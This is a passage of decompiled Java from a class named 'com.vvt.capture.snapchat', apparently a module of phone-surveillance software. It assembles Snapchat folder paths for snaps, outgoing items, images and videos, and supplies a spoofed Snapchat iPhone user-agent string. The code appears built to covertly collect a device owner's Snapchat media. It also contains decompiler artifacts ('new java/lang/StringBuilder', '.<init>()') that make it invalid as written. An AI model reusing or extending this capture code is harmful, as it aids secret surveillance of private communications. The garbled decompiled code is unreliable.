      str1 = String.format("%s/%s", arrayOfObject);
      localArrayList.add(str1);
      arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      arrayOfObject[j] = "snaps";
      str1 = String.format("%s/%s", arrayOfObject);
      localArrayList.add(str1);
      arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      arrayOfObject[j] = "tosend";
      str1 = String.format("%s/%s", arrayOfObject);
      localArrayList.add(str1);
      arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      String str2 = "image";
      arrayOfObject[j] = str2;
      String str3 = String.format("%s/%s", arrayOfObject);
      localArrayList.add(str3);
      str3 = "%s/%s";
      arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      arrayOfObject[j] = "video";
      str1 = String.format(str3, arrayOfObject);
      localArrayList.add(str1);
      a(localArrayList);
    }
  }
  
  private static String i()
  {
    return "Snapchat/9.1.2.0 (iPhone6,2; iOS 9.3.3; gzip)";
  }
  
  private static String j()
  {
    Object localObject1 = Locale.getDefault().getLanguage();
    Object localObject2 = Locale.ENGLISH.getLanguage();
    boolean bool = ((String)localObject1).equals(localObject2);
    if (!bool)
    {
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      localObject2 = ";q=1, en;q=0.9";
      localObject1 = (String)localObject2;
    }
    return (String)localObject1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */